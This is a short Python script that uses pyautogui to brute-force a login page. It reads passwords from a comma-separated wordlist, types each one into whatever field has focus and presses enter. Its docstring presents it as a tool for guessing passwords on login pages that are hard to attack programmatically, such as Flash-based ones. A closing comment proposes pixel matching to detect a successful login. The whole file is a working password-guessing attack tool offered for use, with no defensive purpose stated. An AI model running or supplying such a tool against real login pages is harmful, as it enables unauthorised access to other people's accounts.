#!/usr/bin/python

import datetime
import time
import pyautogui

'''
This program rapidly enters words into a field and presses enter.
This is meant for situations where you have to manually brute force a login page.
Example: A login page that uses flash so it is not easy to programatically brute force
the login. To use run this program from a command prompt and click in the filed you
want to enter passwords into. Program will start after 5 seconds. This works in Chrome.
'''

def textprompt():
	x = pyautogui.confirm('Click OK to begin then click in the password field. Brute force starts after 5 seconds. Cancel to Exit.')
	if x == 'Cancel':
		exit()
	else:
		#change wordlist text/.csv file here
		passcrack('passwordCommas.txt')

def passcrack(file_name):
	word_file = open(file_name,'r')
	words = word_file.read()
	word_file.close()
	word_list = words.split(',')
	time.sleep(5)
	for word in word_list[0::]:
			pyautogui.hotkey('ctrl','a')
			pyautogui.typewrite(word, interval=0.0001)
			pyautogui.typewrite(['enter'])
			print(word)

'''	
 Add a break statement that uses pyautogui pixel matching to determine if it logged in or not.
https://www.programiz.com/python-programming/break-continue
'''

textprompt()